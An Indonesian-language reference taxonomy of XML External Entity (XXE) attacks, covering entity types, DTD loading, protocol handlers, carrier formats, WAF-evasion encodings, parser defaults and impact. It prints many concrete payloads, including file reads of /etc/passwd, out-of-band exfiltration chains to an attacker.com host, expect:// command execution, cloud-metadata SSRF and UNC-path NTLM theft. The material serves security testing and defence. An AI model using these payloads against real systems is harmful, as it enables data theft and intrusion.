---
title: "XXE (XML External Entity)"
description: ""
---

## Struktur Klasifikasi

Kerentanan XXE muncul dari desain fundamental XML: spesifikasi bahasa mengizinkan dokumen untuk mereferensikan sumber daya eksternal melalui deklarasi entitas dalam Document Type Definition (DTD). Ketika parser XML memproses input yang tidak tepercaya dengan resolusi entitas yang diaktifkan, penyerang dapat memanfaatkan mekanisme ini untuk membaca file lokal, melakukan server-side request forgery, mengekstrak data, atau menyebabkan denial of service.

Taksonomi ini mengorganisir attack surface XXE di sepanjang tiga sumbu. **Sumbu 1 (Mutation Target)** mengklasifikasikan teknik berdasarkan komponen struktural XML yang dieksploitasi — tipe entitas, mekanisme pemuatan DTD, protocol handler, format carrier, lapisan encoding, perilaku khusus parser, dan struktur ekspansi entitas. **Sumbu 2 (Exploitation Channel)** mendeskripsikan bagaimana penyerang mengambil data atau mencapai dampak — respons in-band langsung, eksfiltrasi out-of-band, kebocoran berbasis error, pivoting SSRF, atau penipisan sumber daya. **Sumbu 3 (Attack Scenario)** memetakan teknik ke konteks dampak dunia nyata.

Penyebab utamanya tunggal: parser XML yang me-resolve entitas secara default, dikombinasikan dengan izin spesifikasi untuk referensi sumber daya eksternal. Setiap mutasi dalam taksonomi ini mengeksploitasi variasi dari mekanisme fundamental ini.

### Ringkasan Sumbu 2: Exploitation Channel

| Channel | Mekanisme | Pengembalian Data |
|---------|-----------|-------------|
| **Direct (In-Band)** | Nilai entitas direfleksikan dalam respons HTTP | Konten file lengkap dalam response body |
| **Out-of-Band (OOB)** | Entitas memicu callback HTTP/FTP/DNS ke server penyerang | Data diekstrak via parameter URL atau saluran data FTP |
| **Error-Based** | Entitas yang salah format memicu error parser yang berisi konten file | Data bocor dalam pesan error |
| **Blind Detection** | Tidak ada pengembalian data; dikonfirmasi via timing atau interaksi OOB | Boolean: rentan atau tidak |
| **SSRF Pivot** | URL entitas menargetkan layanan internal | Respons layanan internal atau efek samping |
| **Resource Exhaustion** | Ekspansi entitas mengonsumsi memori/CPU | Denial of service |

---

## §1. Mutasi Tipe & Deklarasi Entitas

XML mendefinisikan dua kategori entitas fundamental — general entity (direferensikan dengan `&name;` dalam konten dokumen) dan parameter entity (direferensikan dengan `%name;` dalam DTD). Pilihan di antara keduanya, dikombinasikan dengan deklarasi internal vs. eksternal, menentukan data apa yang dapat diakses dan bagaimana data tersebut dapat diekstraksi.

### §1-1. General External Entity (XXE Klasik)

Varian XXE paling langsung: general entity eksternal dideklarasikan dengan identifier `SYSTEM` atau `PUBLIC` yang menunjuk ke sumber daya target, lalu direferensikan dalam body dokumen. Jika parser me-resolve-nya dan respons mencerminkan nilai entitas, penyerang membaca file secara langsung.

| Subtipe | Mekanisme | Contoh |
|---------|-----------|---------|
| **SYSTEM file read** | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` direferensikan sebagai `&xxe;` dalam body | `<data>&xxe;</data>` mengembalikan konten file |
| **PUBLIC entity** | Menggunakan identifier `PUBLIC` dengan fallback URI `SYSTEM`; beberapa parser mencoba katalog publik terlebih dahulu | `<!ENTITY xxe PUBLIC "-//attacker//DTD//EN" "file:///etc/passwd">` |
| **HTTP entity** | `SYSTEM "http://internal-host/admin"` memicu SSRF | Digunakan untuk probing layanan internal (§7-2) |

**Kondisi**: Parser harus mengizinkan general entity eksternal dan mencerminkan nilai yang di-resolve dalam respons. Ini adalah XXE "klasik" yang dijelaskan oleh sebagian besar tutorial.

### §1-2. Parameter Entity

Parameter entity (`%name;`) hanya valid dalam deklarasi DTD. Parameter entity sangat penting untuk eksploitasi blind XXE karena memungkinkan konstruksi dinamis dari deklarasi entitas — sesuatu yang tidak dapat dilakukan oleh general entity.

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **External parameter entity (deteksi OOB)** | `<!ENTITY % xxe SYSTEM "http://attacker.com/canary"> %xxe;` | Mengkonfirmasi kerentanan via callback OOB bahkan ketika tidak ada data yang direfleksikan |
| **Nested parameter entity (eksfiltrasi data)** | `%file;` memuat file target, `%exfil;` membangun URL yang berisi konten file, memicu permintaan HTTP | Memerlukan DTD eksternal (§2-2) karena referensi parameter entity bersarang dilarang dalam internal DTD subset |
| **Parameter entity dalam internal DTD** | Penggunaan langsung dalam internal DTD `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe;]>` | Bekerja untuk deteksi OOB tetapi tidak dapat menyarangkan entitas untuk eksfiltrasi data |

**Batasan kritis**: Spesifikasi XML melarang referensi parameter entity dalam definisi entitas lain di internal DTD subset. Pembatasan ini mendorong kebutuhan akan pemuatan DTD eksternal (§2) dalam skenario eksfiltrasi blind.

### §1-3. Character Entity dan Predefined Entity

Ini bukan vektor serangan itu sendiri tetapi berinteraksi dengan teknik eksploitasi dengan menyebabkan kegagalan parser selama resolusi entitas.

| Subtipe | Mekanisme | Dampak pada Eksploitasi |
|---------|-----------|----------------------|
| **Karakter khusus XML dalam konten file** | File yang berisi `<`, `>`, `&` merusak ekspansi entitas saat dimasukkan ke konteks XML | Memaksa penggunaan pembungkus CDATA (§5-4) atau eksfiltrasi OOB/FTP (§3-3) |
| **Tanda persen dalam konten file** | `%` dalam konten file yang diekstrak merusak resolusi parameter entity | Tidak dapat diekstrak via URL parameter entity; memerlukan saluran FTP atau metode berbasis error |
| **Byte non-Unicode** | Byte di bawah `0x20` (kecuali `\t`, `\n`, `\r`) tidak valid dalam XML 1.0 | File biner tidak dapat diekstrak secara langsung; memerlukan Base64 via PHP wrapper (§3-4) atau encoding serupa |

---

## §2. Mutasi Mekanisme Pemuatan DTD

DTD adalah kendaraan yang melaluinya deklarasi entitas diperkenalkan. Sumber dan struktur DTD menentukan teknik nesting entitas apa yang tersedia dan pembatasan apa yang berlaku.

### §2-1. Internal DTD Subset

Deklarasi entitas ditempatkan langsung dalam `<!DOCTYPE foo [ ... ]>` dalam dokumen XML itu sendiri.

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Inline general entity** | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | Serangan paling sederhana; memerlukan refleksi entitas dalam respons |
| **Inline parameter entity (hanya OOB)** | `<!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe;` | Dapat memicu OOB tetapi tidak dapat menyarangkan entitas untuk eksfiltrasi data |

**Batasan**: Larangan spesifikasi XML pada referensi parameter entity bersarang dalam internal DTD berarti eksfiltrasi data via parameter entity memerlukan DTD eksternal.

### §2-2. Pemuatan DTD Eksternal

Parser mengambil DTD dari server yang dikendalikan penyerang, memungkinkan teknik parameter entity bersarang.

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Remote DTD via SYSTEM** | `<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;` | Memerlukan HTTP keluar dari server target |
| **Remote DTD via PUBLIC** | Menggunakan identifier PUBLIC dengan URI fallback SYSTEM | Beberapa parser lebih memilih pencarian katalog PUBLIC |
| **DTD-hosted nested exfiltration** | DTD eksternal mendefinisikan: `<!ENTITY % data SYSTEM "file:///etc/passwd"> <!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%data;'>"> %exfil; %send;` | Rantai eksfiltrasi blind XXE yang kanonik |

### §2-3. Pemanfaatan Ulang DTD Lokal

Ketika koneksi keluar diblokir, penyerang dapat memanfaatkan ulang file DTD yang sudah ada di filesystem sistem target. Dengan mendefinisikan ulang entitas yang dideklarasikan dalam DTD lokal dalam internal DTD subset, eksfiltrasi berbasis error menjadi mungkin tanpa akses jaringan eksternal apa pun.

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **DTD lokal Linux** | Mendefinisikan ulang entitas dalam `/usr/share/yelp/dtd/docbookx.dtd` atau `/usr/share/xml/fontconfig/fonts.dtd` | File DTD harus ada di target; nama entitas harus cocok |
| **DTD lokal Windows** | Mendefinisikan ulang entitas dalam `C:\Windows\System32\wbem\xml\cim20.dtd` atau serupa | Path DTD khusus Windows |
| **DTD aplikasi kustom** | Aplikasi menyertakan file DTD-nya sendiri yang dapat dimanfaatkan ulang | Memerlukan pengetahuan tentang lokasi file DTD aplikasi |

**Mekanisme**: Internal DTD subset mendefinisikan ulang parameter entity dari DTD lokal, menyuntikkan entitas bersarang yang memicu parsing error yang berisi konten file target. Ini bekerja karena redefinisi entitas dalam internal subset menimpa definisi DTD (lokal) eksternal, dan larangan nesting di-bypass karena entitas *awalnya* dideklarasikan dalam DTD eksternal.

**Contoh** (menggunakan Yelp DTD di Linux):
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

### §2-4. Teknik DTD Hibrida

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **DTD chaining** | Internal DTD memuat DTD eksternal, yang memuat DTD eksternal lainnya | Resolusi entitas multi-hop; setiap hop dapat menambah entitas baru |
| **Conditional DTD section** | `<![ INCLUDE [ ... ]]>` dan `<![ IGNORE [ ... ]]>` dikendalikan oleh parameter entity | Hanya valid dalam external DTD subset; dapat digunakan untuk pemilihan payload kondisional |

---

## §3. Mutasi Protocol Handler & URI Scheme

URI scheme dalam identifier `SYSTEM` menentukan sumber daya apa yang dapat diakses parser. Parser XML yang berbeda mendukung protokol yang berbeda, menciptakan attack surface yang kaya di luar pembacaan `file://` sederhana.

### §3-1. Protokol File System

| Subtipe | Mekanisme | Dukungan Parser |
|---------|-----------|---------------|
| **`file:///`** | Pembacaan file lokal langsung | Universal — semua parser |
| **`file:///c:/`** | Path file Windows | Parser berbasis Windows |
| **`file:////server/share`** | Path UNC untuk akses SMB/CIFS | Windows — memicu autentikasi NTLM ke server SMB penyerang (§7-4); juga berfungsi sebagai saluran eksfiltrasi data ketika konten file yang di-resolve entitas disematkan dalam path UNC, mengirimkan data melalui SMB ke share yang dikendalikan penyerang (§7-3) |
| **`netdoc:///`** | Alias khusus Java untuk `file://` | Parser XML Java (legacy) |

### §3-2. Protokol HTTP/HTTPS

| Subtipe | Mekanisme | Kasus Penggunaan |
|---------|-----------|----------|
| **`http://` SSRF** | Parser membuat permintaan HTTP ke URL yang ditentukan | Akses layanan internal, cloud metadata (§7-2) |
| **`https://`** | Sama seperti HTTP tetapi terenkripsi | Bypass pemantauan jaringan; memerlukan dukungan TLS parser |
| **Eksfiltrasi HTTP dengan query string** | `http://attacker.com/?data=%file;` | Eksfiltrasi data OOB via parameter URL |

### §3-3. Protokol FTP

| Subtipe | Mekanisme | Keunggulan Utama |
|---------|-----------|---------------|
| **Eksfiltrasi OOB FTP** | URL entitas `ftp://attacker.com:2121/%file;` | Saluran data FTP dapat menangani konten multi-baris yang tidak dapat ditangani parameter URL HTTP |
| **FTP untuk karakter khusus** | FTP mentoleransi karakter yang merusak URL HTTP | Dapat mengekstrak file yang berisi `#`, `?`, dan beberapa kemunculan `&` |

**Keunggulan dibanding HTTP**: Eksfiltrasi OOB HTTP menyematkan konten file dalam URL, yang rusak pada baris baru dan karakter khusus. FTP mengirimkan konten file melalui saluran data, menangani file multi-baris secara native (meskipun `%` dan beberapa karakter kontrol masih menyebabkan masalah).

### §3-4. PHP Stream Wrapper

Integrasi libxml2 PHP mengekspos PHP stream wrapper ke parser XML, yang secara dramatis memperluas attack surface.

| Subtipe | Mekanisme | Dampak |
|---------|-----------|--------|
| **`php://filter/convert.base64-encode/resource=`** | Meng-encode Base64 konten file sebelum resolusi entitas | Menyelesaikan masalah karakter khusus — file apa pun dapat diekstrak dengan bersih |
| **Rantai `php://filter`** | Merangkai beberapa filter (misalnya `string.rot13`, `convert.iconv`) | Dapat mengubah konten file untuk mem-bypass deteksi WAF |
| **`expect://`** | Mengeksekusi perintah sistem (memerlukan ekstensi `expect`) | RCE langsung: `<!ENTITY xxe SYSTEM "expect://id">` |
| **`data://`** | URI data inline | `data://text/plain;base64,BASE64PAYLOAD` — bypass filter kata kunci |
| **`phar://`** | Memicu deserialisasi PHP pada arsip Phar | Rantai XXE → deserialisasi Phar → RCE |
| **`compress.zlib://`** | Membaca file terkompresi | Akses file `.gz` atau bypass inspeksi konten |

### §3-5. Protokol Khusus Java

| Subtipe | Mekanisme | Dampak |
|---------|-----------|--------|
| **`jar://`** | Mengakses file dalam arsip ZIP/JAR via URL | `jar:http://attacker.com/evil.jar!/file.txt` — parser mengunduh arsip, mengekstrak file; file sementara tertinggal di disk |
| **`jar:` untuk pembuatan file sementara** | Parser mengunduh dan menyimpan JAR ke direktori temp | Dapat menanamkan file di filesystem; dikombinasikan dengan kerentanan lain untuk RCE |
| **`gopher://` (legacy)** | Komunikasi soket TCP mentah | Sudah tidak digunakan di Java modern; ketika tersedia, memungkinkan interaksi protokol TCP arbitrer |
| **`netdoc://`** | Alternatif untuk `file://` di Java | Dapat mem-bypass pemeriksaan blocklist `file://` |

### §3-6. Deteksi Berbasis DNS

| Subtipe | Mekanisme | Kasus Penggunaan |
|---------|-----------|----------|
| **DNS OOB via subdomain** | `http://%file;.attacker.com/` | Mengekstrak potongan data kecil via kueri DNS subdomain; bekerja bahkan ketika HTTP diblokir |
| **DNS canary** | `http://unique-id.attacker-dns.com/` | Deteksi kerentanan murni tanpa eksfiltrasi data |

---

## §4. Mutasi Format XML & Carrier

XXE tidak terbatas pada endpoint XML mentah. Setiap fitur aplikasi yang memproses format berbasis XML adalah attack surface potensial, termasuk upload file, parser dokumen, dan endpoint API.

### §4-1. Carrier Format Dokumen

Banyak format dokumen umum adalah arsip ZIP yang berisi file XML. Menyuntikkan payload XXE ke dalam file XML yang disematkan ini dapat menjangkau parser yang mungkin tidak disadari developer sedang memproses XML.

| Subtipe | Format Carrier | File XML Target | Titik Masuk Tipikal |
|---------|---------------|-----------------|-------------------|
| **DOCX/PPTX/XLSX** | Office Open XML (OOXML) | `[Content_Types].xml`, `word/document.xml`, `xl/sharedStrings.xml` | Upload file, impor dokumen, impor data |
| **ODT/ODS/ODP** | OpenDocument Format | `content.xml`, `meta.xml`, `styles.xml` | Upload file, konversi dokumen |
| **SVG** | Scalable Vector Graphics | File SVG itu sendiri (XML root) | Upload gambar, upload avatar, foto profil |
| **PDF (XFA)** | Form XFA yang disematkan dalam PDF | Stream XML XFA dalam struktur PDF | Upload form, pemrosesan dokumen (CVE-2025-66516) |

**Contoh (SVG)**:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### §4-2. Carrier API & Protokol

| Subtipe | Protokol/Format | Mekanisme |
|---------|----------------|-----------|
| **Endpoint SOAP** | SOAP/XML Web Services | Body XML langsung berisi deklarasi entitas; layanan legacy sering memiliki konfigurasi parser yang permisif |
| **REST dengan Content-Type XML** | REST API yang menerima `application/xml` | Banyak REST API yang terutama menggunakan JSON juga menerima XML jika `Content-Type: application/xml` dikirim |
| **XML-RPC** | Protokol XML-RPC | Pemanggilan metode adalah dokumen XML; jarang diperkuat terhadap XXE |
| **Feed RSS/Atom** | Feed sindikasi | Parser feed yang memproses URL feed yang diserahkan pengguna |
| **SAML** | Security Assertion Markup Language | Assertion dan respons SAML adalah XML; XXE dalam SAML dapat mem-bypass autentikasi |
| **XMPP** | Extensible Messaging and Presence Protocol | Protokol chat yang menggunakan XML stream |
| **EPP (Extensible Provisioning Protocol)** | EPP (RFC 5730) / XML over TLS | EPP adalah protokol native XML untuk registrasi domain antara registrar dan registry. XXE dalam implementasi server EPP memungkinkan pengungkapan file lokal dan manipulasi zona domain yang tidak sah — didemonstrasikan via kompromi Perangkat Lunak Registry CoCCA yang memengaruhi infrastruktur ccTLD |

### §4-3. Content-Type Confusion

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **JSON-to-XML swap** | Ubah `Content-Type: application/json` menjadi `Content-Type: application/xml` dan kirim body XML | Framework backend mendeteksi dan merutekan otomatis ke parser XML |
| **Multipart XML injection** | Payload XML dalam field multipart form data | Parser memproses XML dari nilai field form |
| **URL-encoded XML** | Payload XML yang di-URL-encode dalam parameter POST | Aplikasi mendekode dan mengurai XML dari parameter |

### §4-4. XInclude Injection

Ketika aplikasi menyisipkan input pengguna ke dalam dokumen XML sisi server (bukan mengurai dokumen yang disediakan pengguna), penyerang tidak dapat mengontrol DOCTYPE. XInclude menyediakan alternatif.

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **XInclude file read** | `<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd" parse="text"/>` | Parser harus mengaktifkan pemrosesan XInclude |
| **XInclude dengan fallback** | Elemen `<xi:fallback>` menyediakan konten alternatif jika `href` utama gagal | Berguna untuk pengumpulan informasi berbasis error |

### §4-5. XXE Terkait XSLT

| Subtipe | Mekanisme | Dampak |
|---------|-----------|--------|
| **XXE dalam stylesheet XSLT** | Deklarasi entitas dalam DOCTYPE file XSLT | Jika pengguna dapat menyediakan/memengaruhi stylesheet XSLT, XXE berlaku |
| **Fungsi `xsl:document()`** | Fungsi XSLT yang membaca dokumen eksternal | Pembacaan file tanpa deklarasi entitas |
| **XSLT ke RCE** | `xsl:script` atau fungsi ekstensi Java/C# dalam XSLT | Eksekusi kode penuh via ekstensi prosesor XSLT |

---

## §5. Mutasi Encoding & Obfuscation

Mutasi berbasis encoding menargetkan celah antara apa yang dapat diurai WAF/IDS dan apa yang sebenarnya diproses parser XML. Karena XML mendukung beberapa encoding karakter dan parser mendeteksi encoding secara otomatis, ini menciptakan attack surface evasion yang kaya.

### §5-1. Bypass Encoding Karakter

| Subtipe | Mekanisme | Dampak pada WAF |
|---------|-----------|-----------|
| **UTF-16 BE/LE** | `<?xml version="1.0" encoding="UTF-16BE"?>` dengan payload dalam UTF-16 | WAF melihat data biner; parser XML mendekode dengan benar |
| **Varian UTF-32** | UTF-32BE, UTF-32LE, UCS-4 (2143), UCS-4 (3412) | Encoding langka yang sebagian besar WAF tidak dapat mendekodenya |
| **UTF-7** | `<?xml version="1.0" encoding="UTF-7"?>` | Encoding legacy; beberapa parser mendukungnya, sebagian besar WAF tidak |
| **EBCDIC** | Encoding karakter IBM mainframe | Niche tetapi encoding XML yang valid; sepenuhnya tidak transparan bagi WAF standar |
| **Mixed encoding** | Mulai dokumen dalam satu encoding, beralih di tengah dokumen | Mengeksploitasi deteksi encoding parser vs. analisis statis WAF |

**Contoh konversi**: `iconv -f UTF-8 -t UTF-16BE payload.xml > payload_utf16.xml`

### §5-2. Manipulasi Deklarasi XML

| Subtipe | Mekanisme | Efek |
|---------|-----------|--------|
| **Whitespace berlebih dalam `<?xml?>`** | `<?xml    version="1.0"    encoding="UTF-8"?>` | Merusak pola regex WAF yang mengharapkan format tertentu |
| **Deklarasi XML yang hilang** | Hilangkan `<?xml?>` seluruhnya; parser menggunakan encoding default | WAF mungkin tidak mengenali dokumen sebagai XML |
| **Ketidakcocokan deklarasi encoding** | Deklarasikan satu encoding dalam `<?xml?>`, kirim dokumen dalam encoding lain | Perilaku parser bervariasi; dapat membingungkan WAF dan parser |

### §5-3. Encoding HTML Entity dalam DTD

| Subtipe | Mekanisme | Contoh |
|---------|-----------|---------|
| **Referensi karakter hex** | `&#x25;` untuk `%`, `&#x73;` untuk `s` | Bypass filter kata kunci untuk `SYSTEM`, `ENTITY`, dll. |
| **Referensi karakter desimal** | `&#37;` untuk `%`, `&#115;` untuk `s` | Alternatif untuk hex encoding |
| **Obfuscation kata kunci** | Encode `SYSTEM` sebagai `S&#x59;STEM` atau `&#83;&#89;&#83;&#84;&#69;&#77;` | Bypass aturan WAF yang mencocokkan literal kata kunci `SYSTEM` |

### §5-4. CDATA Wrapping

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **Pembungkus eksfiltrasi CDATA** | DTD eksternal membangun `<![CDATA[%file;]]>` di sekitar konten file via konkatenasi entitas | Menyelesaikan masalah karakter khusus XML untuk `<`, `>`, `&` |
| **CDATA dalam payload OOB** | Bungkus data yang diekstrak dalam CDATA sebelum dikirim via HTTP/FTP | Mengurangi error parsing selama eksfiltrasi |

**Batasan**: Pembungkus CDATA tidak dapat menangani file yang berisi `]]>` (yang mengakhiri bagian CDATA) atau `%` (yang merusak resolusi parameter entity).

### §5-5. Injeksi Komentar dan Whitespace

| Subtipe | Mekanisme | Efek |
|---------|-----------|--------|
| **Komentar XML dalam DOCTYPE** | `<!DOCTYPE foo [<!-- comment --><!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | Merusak pencocokan pola WAF |
| **Baris baru dalam deklarasi** | Pisahkan `<!ENTITY` di beberapa baris | WAF mungkin hanya memeriksa N byte pertama atau baris pertama |
| **Null byte** | Sisipkan null byte di antara token | Beberapa WAF terpotong pada null byte; parser XML melewatinya |

---

## §6. Mutasi Perilaku Khusus Parser

Implementasi parser XML bervariasi secara signifikan di berbagai bahasa dan library. Konfigurasi default, fitur yang didukung, dan penanganan edge case berbeda, menciptakan vektor serangan khusus parser.

### §6-1. Parser XML Java

Java memiliki ekosistem pemrosesan XML terluas dan, secara historis, konfigurasi default yang paling permisif.

| Parser/API | Status XXE Default | Perilaku Utama |
|-----------|-------------------|-------------|
| **DocumentBuilderFactory** | Rentan secara default (pre-JAXP security properties) | Harus secara eksplisit menonaktifkan external entity dan DTD |
| **SAXParserFactory** | Rentan secara default | Mitigasi yang sama seperti DocumentBuilderFactory |
| **XMLInputFactory (StAX)** | `IS_SUPPORTING_EXTERNAL_ENTITIES` default tidak ditentukan (bergantung pada implementasi) | Harus menetapkan `IS_SUPPORTING_EXTERNAL_ENTITIES` dan `SUPPORT_DTD` ke false |
| **TransformerFactory** | Rentan secara default | Mendukung protokol `jar://`, `netdoc://` |
| **DOM4J** | Rentan secara default | Memerlukan konfigurasi SAXReader |
| **JAXB Unmarshaller** | Umumnya aman dalam versi terbaru | Bergantung pada konfigurasi parser yang mendasarinya |

**Protokol khusus Java**: `jar://`, `netdoc://`, dan (dalam versi lama) `gopher://` tersedia melalui mekanisme URL handler Java (§3-5).

### §6-2. PHP / libxml2

| Aspek | Perilaku |
|--------|----------|
| **PHP < 8.0** | `libxml_disable_entity_loader(false)` adalah default; XXE memungkinkan |
| **PHP >= 8.0** | Pemuatan external entity dinonaktifkan secara default; `libxml_disable_entity_loader()` deprecated |
| **Flag `LIBXML_NOENT`** | Secara eksplisit mengaktifkan substitusi entitas — memperkenalkan ulang XXE bahkan di PHP 8.0+ |
| **`simplexml_load_string()` dengan opsi** | Meneruskan `LIBXML_NOENT` sebagai opsi membuatnya rentan |
| **PHP stream wrapper** | `php://filter`, `expect://`, `phar://`, `data://` tersedia via I/O handler libxml2 (§3-4) |
| **Bypass `LIBXML_NONET` (double-parse)** | `LIBXML_NONET` menekan akses jaringan tetapi bukan ekspansi parameter entity pada waktu parse; dalam alur parse–sanitize–re-parse, entitas yang mereferensikan rantai `php://filter` berkembang selama pass pertama sebelum flag berlaku, memungkinkan pembacaan file lokal dalam konfigurasi yang diperkuat |

### §6-3. Parser XML .NET

| Parser/Class | Status XXE Default | Perilaku Utama |
|-------------|-------------------|-------------|
| **XmlReader (>= .NET 4.5.2)** | Aman secara default (`DtdProcessing.Prohibit`) | Harus secara eksplisit mengaktifkan pemrosesan DTD agar rentan |
| **XmlTextReader (< .NET 4.5.2)** | Rentan secara default | Harus menetapkan `DtdProcessing = DtdProcessing.Prohibit` |
| **XmlDocument (>= .NET 4.5.2)** | Aman secara default (null `XmlResolver`) | Menetapkan `XmlResolver` memperkenalkan ulang kerentanan |
| **XPathNavigator** | Bergantung pada reader yang mendasarinya | Mewarisi konfigurasi reader |
| **Bypass larangan DTD (CVE-2024-30043)** | XmlReader me-resolve parameter entity *sebelum* memeriksa larangan DTD | OOB XXE memungkinkan bahkan dengan `DtdProcessing.Prohibit` dalam konfigurasi tertentu |

### §6-4. Parser XML Python

| Parser | Status XXE Default |
|--------|-------------------|
| **xml.etree.ElementTree** | Aman — tidak memproses external entity |
| **xml.dom.minidom** | Aman secara default |
| **xml.sax** | Berpotensi rentan — bergantung pada konfigurasi handler |
| **lxml** | Rentan jika `resolve_entities=True` (bukan default sejak lxml 3.x) |
| **defusedxml** | Library yang diperkuat — alternatif aman untuk semua parsing XML Python |

### §6-5. Parser XML Ruby

| Parser | Status XXE Default |
|--------|-------------------|
| **Nokogiri (>= 1.5.4)** | External entity dinonaktifkan secara default |
| **Nokogiri (flag `NOENT`)** | Meneruskan `Nokogiri::XML::ParseOptions::NOENT` mengaktifkan ulang pemrosesan entitas |
| **REXML** | Umumnya aman — tidak me-resolve external entity |

### §6-6. Perilaku libxml2 (Bersama di Berbagai Bahasa)

libxml2 menopang parsing XML di PHP, Python (lxml), Ruby (Nokogiri), dan banyak bahasa lainnya. Perilakunya adalah benang merah bersama.

| Perilaku | Deskripsi | Dampak |
|----------|-------------|--------|
| **Deteksi encoding otomatis** | Membaca BOM dan `<?xml encoding="">` untuk menentukan encoding | Bypass WAF berbasis encoding (§5-1) |
| **Batas kedalaman entitas** | Membatasi ekspansi entitas bersarang untuk mencegah billion laughs | Dapat disiasati dengan quadratic blowup (§7-1) |
| **`xmlCtxtUseOptions()`** | Memproses flag opsi seperti `XML_PARSE_NOENT`, `XML_PARSE_DTDLOAD` | Flag yang salah konfigurasi di level aplikasi memperkenalkan ulang XXE |

---

## §7. Kategori Mutasi Berorientasi Dampak

Kategori-kategori ini mengorganisir teknik berdasarkan efek akhirnya daripada mekanisme strukturalnya, berfungsi sebagai jembatan antara mekanik mutasi dan eksploitasi dunia nyata.

### §7-1. Denial of Service via Ekspansi Entitas

Ekspansi entitas XML dapat mengonsumsi memori/CPU secara eksponensial atau kuadratik tanpa memerlukan akses jaringan eksternal apa pun.

| Subtipe | Mekanisme | Konsumsi Sumber Daya |
|---------|-----------|---------------------|
| **Billion Laughs (Ekspansi Eksponensial)** | 10 entitas, masing-masing didefinisikan sebagai 10x yang sebelumnya; entitas akhir berkembang menjadi ~10^9 salinan | ~3 GB memori dari payload <1 KB |
| **Quadratic Blowup** | Satu entitas besar (misalnya 55.000 karakter) direferensikan 55.000 kali | ~2,5 GB dari payload ~200 KB; mem-bypass batas kedalaman entitas |
| **Recursive entity expansion** | Entitas A mereferensikan Entitas B yang mereferensikan Entitas A | Beberapa parser mendeteksi dan memblokir; yang lain crash |
| **External entity DoS** | Entitas menunjuk ke `/dev/random`, `/dev/urandom`, atau stream HTTP tak terbatas | Parser hang tanpa batas waktu saat mencoba membaca |
| **Decompression bomb** | `jar://` atau `compress.zlib://` menunjuk ke zip bomb | Penipisan disk/memori selama dekompresi |

**Catatan pertahanan**: Billion Laughs banyak terdeteksi oleh parser modern via batas kedalaman/ekspansi entitas. Quadratic Blowup mem-bypass batas ini karena menggunakan pengulangan flat (tidak bersarang).

### §7-2. SSRF via XXE

XXE adalah salah satu vektor SSRF paling andal karena parser itu sendiri yang membuat permintaan HTTP, mewarisi posisi jaringan dan kredensial server.

| Subtipe | Target | Dampak |
|---------|--------|--------|
| **Cloud metadata** | `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/` (GCP) | Pencurian kredensial cloud, pengambilalihan instance |
| **Internal API probing** | `http://internal-service:8080/api/admin` | Akses ke layanan internal di belakang firewall |
| **Port scanning** | Iterasi entitas pada `http://target:PORT/` dan amati waktu respons/error | Pemetaan topologi jaringan internal |
| **Akses layanan localhost** | `http://127.0.0.1:XXXX/` | Akses layanan yang terikat hanya ke loopback |

### §7-3. Rantai Eksfiltrasi Data

Eksfiltrasi yang kompleks memerlukan perangkaian beberapa teknik dari kategori sebelumnya.

| Rantai | Komponen | Menangani Multi-baris | Menangani Karakter Khusus |
|-------|-----------|-------------------|---------------------|
| **HTTP OOB (sederhana)** | §1-2 + §2-2 + §3-2 | Tidak | Tidak (`#`, `?`, `&` merusak URL) |
| **FTP OOB** | §1-2 + §2-2 + §3-3 | Ya (via saluran data FTP) | Sebagian (masih rusak pada `%`) |
| **Error-based + local DTD** | §1-2 + §2-3 + refleksi pesan error | Hanya satu baris | Terbatas |
| **PHP filter Base64** | §3-4 + `php://filter/convert.base64-encode` | Ya (Base64 adalah satu baris) | Ya (Base64 meng-encode segalanya) |
| **Eksfiltrasi DNS** | §3-6 + subdomain encoding | Tidak (batas label 63 karakter) | Terbatas (charset label DNS) |
| **CDATA wrapping** | §5-4 + §2-2 (DTD eksternal) | Ya | Sebagian (rusak pada `]]>` dan `%`) |
| **Eksfiltrasi Windows UNC/SMB** | §1-1 + §3-1 (UNC) + server SMB penyerang | Ya (saluran data SMB menangani multi-baris secara native) | Ya (transport aman-biner; tidak ada batasan URL encoding) |

### §7-4. Pencurian dan Relay Hash NTLM

Khusus Windows: ketika entitas XXE mereferensikan path UNC atau sumber daya SMB, host Windows secara otomatis mengirimkan kredensial autentikasi NTLM.

| Subtipe | Mekanisme | Dampak |
|---------|-----------|--------|
| **UNC path NTLM leak** | `<!ENTITY xxe SYSTEM "\\\\attacker.com\\share">` | Hash NTLMv2 ditangkap oleh Responder/Impacket; cracking offline atau relay |
| **Redirect HTTP → SMB** | Entitas mengambil URL HTTP yang melakukan redirect 302 ke `file://attacker.com/share` | Mem-bypass filter path UNC sambil tetap memicu autentikasi NTLM |
